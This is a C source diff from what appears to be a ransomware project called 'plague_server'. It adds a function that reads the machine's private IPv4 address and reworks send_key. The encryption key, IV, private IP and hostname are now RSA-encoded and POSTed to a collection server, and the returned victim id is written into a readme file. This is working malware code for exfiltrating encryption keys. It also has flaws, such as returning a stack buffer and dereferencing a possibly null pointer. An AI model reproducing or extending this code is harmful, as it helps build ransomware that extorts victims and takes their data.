@@ -14,6 +14,34 @@ void error(const char *msg)
     exit(0);
 }
 
+struct ifaddrs * ifAddrStruct=NULL;
+struct ifaddrs * ifa=NULL;
+void * tmpAddrPtr=NULL;
+
+char *get_privateIP()
+{
+    char *priv_ip;
+
+    getifaddrs(&ifAddrStruct);
+    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
+        if (!ifa->ifa_addr) {
+            continue;
+        }
+        if (ifa->ifa_addr->sa_family == AF_INET)
+        {   // check it is IP4
+            // is a valid IP4 Address
+            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+            char addressBuffer[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
+            //printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer);
+            priv_ip = addressBuffer;
+        }
+    }
+    if (ifAddrStruct!=NULL)
+        freeifaddrs(ifAddrStruct);
+    return strdup(priv_ip);
+}
+
 char *get_hostname()
 {
     char hostname[1024];
@@ -31,31 +59,18 @@ void write_readme(char *id)
     fclose(fp);
 }
 
-int send_key(char *key, char *hostname)
+
+char *send_request(char *message)
 {
     struct hostent *server;
     struct sockaddr_in serv_addr;
     int sockfd, bytes, sent, received, total;
-    char json[1024], message[4096], response[20000]; // revoir les tailles
-    size_t len = 0;
     int port = 80;
-    unsigned char *data;
     char *host = "localhost";
-    char *request = "POST /plague_server/ HTTP/1.1\r\n"
-                    "Host: localhost\r\n"
-                    "Content-Type: application/x-www-form-urlencoded\r\n"
-                    "Content-Length: %d\r\n\r\n"
-                    "data=%s";
-    char *format = "{\"key\":\"%s\", \"hostname\":\"%s\"}";
-    char *encoded;
+    char *response;
 
-    /* fill in the parameters */
-    sprintf(json, format, key, hostname); // 21
-
-    // encode data
-    data = rsa_encode((unsigned char *)json, &len); //encode
-    encoded = bin2hex(data, len);
-    sprintf(message, request, strlen("data=") + strlen((char *)encoded), encoded);
+    if (!(response = malloc(sizeof(char) * RESPONSE_SIZE)))
+        exit(0);
 
     /* create the socket */
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -78,7 +93,7 @@ int send_key(char *key, char *hostname)
         error("ERROR connecting");
 
     /* send the request */
-    total = strlen(message);
+    total = (int)strlen(message);
     sent = 0;
     do {
         bytes = write(sockfd, message + sent, total - sent);
@@ -90,8 +105,8 @@ int send_key(char *key, char *hostname)
     } while (sent < total);
 
     /* receive the response */
-    memset(response, 0, sizeof(response));
-    total = sizeof(response) - 1;
+    memset(response, 0, RESPONSE_SIZE);
+    total = sizeof(char) * RESPONSE_SIZE;
     received = 0;
     do {
         bytes = read(sockfd, response + received, total - received);
@@ -106,12 +121,48 @@ int send_key(char *key, char *hostname)
 
     /* close the socket */
     close(sockfd);
+    return response;
+}
+
+int send_key(char *key, char *iv, char *hostname)
+{
+    char json[1024], message[4096];
+    char *response;
+    size_t len = 0;
+    unsigned char *data;
+    char *request = "POST /plague_server/ HTTP/1.1\r\n"
+                    "Host: localhost\r\n"
+                    "Content-Type:  application/x-www-form-urlencoded\r\n"
+                    "Content-Length: %d\r\n\r\n"
+                    "data=%s";
+    char *format = "{\"key\":\"%s\",\"iv\":\"%s\",\"PrivateIP\":\"%s\",\"hostname\":\"%s\"}";
+    char *encoded;
+    int ret = 0;
+
+    /* fill in the parameters */
+    sprintf(json, format, key, iv, get_privateIP(), hostname);
+
+    // encode data
+    data = rsa_encode((unsigned char *)json, &len); //encode
+    // encoded = base64_encode(data, len, &len);
+    encoded = bin2hex(data, len);
+    // printf("b64 data    : %s\n", encoded);
+    sprintf(message, request, strlen("data=") + strlen((char *)encoded), encoded);
+
+    response = send_request(message);
 
     /* process response */
     char *id = strstr(response, "id:");
+    char *check = strstr(response, "check:");
     if (!id)
         return 0;
     id = strtok(id, " \n");
+    if (check)
+        check = strtok(check, " \n");
+    if (strstr(check, "TRUE") != NULL)
+        ret = 1;
     write_readme(&id[3]);
-    return 0;
+    if (response)
+        free(response);
+    return ret;
 }
